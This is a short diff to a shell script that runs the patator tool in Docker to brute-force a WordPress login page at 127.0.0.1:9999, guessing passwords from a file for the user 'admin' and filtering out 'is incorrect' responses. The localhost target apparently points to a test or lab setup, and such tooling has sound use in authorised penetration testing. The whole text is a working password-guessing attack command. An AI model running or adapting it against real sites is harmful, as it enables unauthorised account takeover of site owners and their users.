@@ -2,9 +2,9 @@
 
 pass='/tmp/pass.txt'
 url='http://127.0.0.1:9999/wp-login.php'
-ignore='is incorrect'
+user='admin'
 
-docker run --rm -i -v $pass:/F0 \
+docker run --rm -it -v $pass:/F0 \
 patator http_fuzz url=$url method=POST \
-body='log=test&pwd=FILE0' 0=/F0 \
--x ignore:fgrep="$ignore"
+body="log=$user&pwd=FILE0" 0=/F0 \
+-x ignore:fgrep='is incorrect' -t 5
